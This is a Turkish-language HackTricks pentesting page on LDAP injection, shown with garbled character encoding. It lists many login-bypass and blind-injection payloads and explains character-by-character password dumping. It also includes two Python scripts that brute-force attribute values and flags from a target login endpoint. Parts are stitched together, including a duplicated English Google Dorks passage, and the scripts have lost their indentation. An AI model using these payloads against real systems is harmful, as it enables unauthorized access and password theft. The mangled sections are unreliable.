# LDAP Enjeksiyonu

## LDAP Enjeksiyonu

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github reposuna **katkÄ±da bulunun**.

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bounty ipucu**: Hackerlar tarafÄ±ndan oluÅŸturulan premium bir **bounty platformu olan Intigriti'ye** **kaydolun**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## LDAP Enjeksiyonu

### **LDAP**

**LDAP'nin ne olduÄŸunu bilmek isterseniz, aÅŸaÄŸÄ±daki sayfaya bakÄ±n:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Enjeksiyonu**, kullanÄ±cÄ± giriÅŸinden LDAP ifadeleri oluÅŸturan web uygulamalarÄ±nÄ± hedef alan bir saldÄ±rÄ±dÄ±r. Uygulama, giriÅŸi **uygun ÅŸekilde temizlemediÄŸinde**, saldÄ±rganlarÄ±n yerel bir proxy aracÄ±lÄ±ÄŸÄ±yla LDAP ifadelerini **manipÃ¼le etmelerine** izin verir ve yetkisiz eriÅŸime veya veri manipÃ¼lasyonuna yol aÃ§abilir.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**Filtre** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr â€=â€ \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Mutlak DOÄRU\
**(|)** = Mutlak YANLIÅ

Ã–rneÄŸin:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

VeritabanÄ±na eriÅŸebilirsiniz ve bu, birÃ§ok farklÄ± tÃ¼rde bilgi iÃ§erebilir.

**OpenLDAP**: 2 filtre gelirse, yalnÄ±zca ilkini yÃ¼rÃ¼tÃ¼r.\
**ADAM veya Microsoft LDS**: 2 filtre ile hata fÄ±rlatÄ±rlar.\
**SunOne Directory Server 5.0**: Her iki filtreyi de yÃ¼rÃ¼tÃ¼r.

**Filtrenin doÄŸru sÃ¶zdizimiyle gÃ¶nderilmesi Ã§ok Ã¶nemlidir, aksi takdirde bir hata fÄ±rlatÄ±lÄ±r. Sadece 1 filtre gÃ¶ndermek daha iyidir.**

Filtre, `&` veya `|` ile baÅŸlamalÄ±dÄ±r\
Ã–rnek: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

Sonra: `(&(objectClass=`**`*)(ObjectClass=*))`** ilk filtre olacak (yÃ¼rÃ¼tÃ¼len filtre). 

### GiriÅŸ Atlatma

LDAP, ÅŸifreyi saklamak iÃ§in birkaÃ§ formatÄ± destekler: aÃ§Ä±k, md5, smd5, sh1, sha, crypt. Bu nedenle, ÅŸifre iÃ§ine ne eklerseniz ekleyin, muhtemelen karma alÄ±nÄ±r.
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) â€”> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### Listeler

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP Ã–znitelikleri](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount Ã¶znitelikleri](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### KÃ¶r LDAP Enjeksiyonu

Herhangi bir veri dÃ¶ndÃ¼rÃ¼lÃ¼p dÃ¶ndÃ¼rÃ¼lmediÄŸini kontrol etmek ve olasÄ± bir KÃ¶r LDAP Enjeksiyonunu doÄŸrulamak iÃ§in YanlÄ±ÅŸ veya DoÄŸru yanÄ±tlarÄ±nÄ± zorlayabilirsiniz:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### Veri dÃ¶kÃ¼mÃ¼

ASCII harfleri, rakamlar ve semboller Ã¼zerinde dÃ¶ngÃ¼ oluÅŸturabilirsiniz:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### Scriptler

#### **GeÃ§erli LDAP alanlarÄ±nÄ± keÅŸfedin**

LDAP nesneleri **varsayÄ±lan olarak birkaÃ§ Ã¶zelliÄŸi iÃ§erir** ve bu Ã¶zellikler kullanÄ±larak **bilgi saklanabilir**. Bu bilgiyi Ã§Ä±karmak iÃ§in tÃ¼m Ã¶zellikleri **brute-force yÃ¶ntemiyle deneyebilirsiniz**. [**Burada varsayÄ±lan LDAP Ã¶zelliklerinin bir listesini bulabilirsiniz**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **Ã–zel KÃ¶r LDAP Enjeksiyonu ("\*" olmadan)**

---

##### **LDAP Injection**

LDAP enjeksiyonu, bir web uygulamasÄ±nÄ±n LDAP (Lightweight Directory Access Protocol) sorgularÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir saldÄ±rÄ± tekniÄŸidir. Bu saldÄ±rÄ±, web uygulamasÄ±nÄ±n LDAP sorgularÄ±nÄ± gÃ¼venli bir ÅŸekilde iÅŸlememesi durumunda gerÃ§ekleÅŸtirilebilir.

##### **Ã–zel KÃ¶r LDAP Enjeksiyonu**

Ã–zel kÃ¶r LDAP enjeksiyonu, hedef web uygulamasÄ±nÄ±n LDAP sorgularÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir tekniktir. Bu teknik, hedef web uygulamasÄ±nÄ±n yanÄ±tÄ±nÄ± almak iÃ§in kÃ¶r sorgular kullanÄ±r. Ancak, bu teknikte "\*" karakteri kullanÄ±lmaz.

##### **Ã–rnek**

AÅŸaÄŸÄ±daki Ã¶rnekte, hedef web uygulamasÄ±nda bir LDAP enjeksiyonu gerÃ§ekleÅŸtirilir:

```plaintext
username=admin*)(password=*))(|(uid=*
```

Bu enjeksiyon, hedef web uygulamasÄ±nÄ±n LDAP sorgusunu manipÃ¼le eder ve tÃ¼m kullanÄ±cÄ±larÄ±n parolalarÄ±nÄ± elde etmek iÃ§in bir saldÄ±rÄ± gerÃ§ekleÅŸtirir.

##### **Korunma YÃ¶ntemleri**

Ã–zel kÃ¶r LDAP enjeksiyonu saldÄ±rÄ±larÄ±ndan korunmak iÃ§in aÅŸaÄŸÄ±daki Ã¶nlemler alÄ±nabilir:

- GiriÅŸ verilerini doÄŸrulamak iÃ§in gÃ¼venilir bir veri doÄŸrulama mekanizmasÄ± kullanÄ±n.
- KullanÄ±cÄ± giriÅŸlerini temizlemek iÃ§in giriÅŸ verilerini uygun bir ÅŸekilde kaÃ§Ä±ÅŸ karakterleriyle iÅŸleyin.
- LDAP sorgularÄ±nÄ± oluÅŸtururken parametrelerinizi doÄŸru bir ÅŸekilde iÅŸleyin ve gÃ¼venli bir ÅŸekilde birleÅŸtirin.
- GÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmek iÃ§in dÃ¼zenli olarak gÃ¼venlik testleri yapÄ±n ve gÃ¼ncel kalÄ±n.
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### Google Dorks

### Google Dorks

Google Dorks, also known as Google Hacking, are search queries that can be used to find sensitive information or vulnerabilities in websites. These queries are entered into the Google search engine to discover specific information that is not easily accessible through normal search methods.

Google Dorks can be used for various purposes, including:

- Finding exposed or leaked sensitive information, such as usernames, passwords, credit card numbers, or social security numbers.
- Identifying vulnerable websites or web applications that can be exploited.
- Discovering specific file types or directories that may contain sensitive information.
- Locating websites or web pages that have been indexed by Google but are not intended to be publicly accessible.

Google Dorks are powerful tools for both ethical hackers and malicious attackers. It is important to use them responsibly and legally, as unauthorized access to sensitive information or systems can have serious consequences.

Here are some examples of commonly used Google Dorks:

- `site:example.com intext:password` - Searches for web pages on the domain example.com that contain the word "password" in the page content.
- `filetype:pdf site:example.com` - Searches for PDF files on the domain example.com.
- `inurl:/admin site:example.com` - Searches for web pages on the domain example.com that have "/admin" in the URL.
- `intitle:"index of" site:example.com` - Searches for web pages on the domain example.com that have "index of" in the page title.

Remember to always use Google Dorks responsibly and with proper authorization.
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### Daha Fazla Payload

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **bug bounty platformu**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
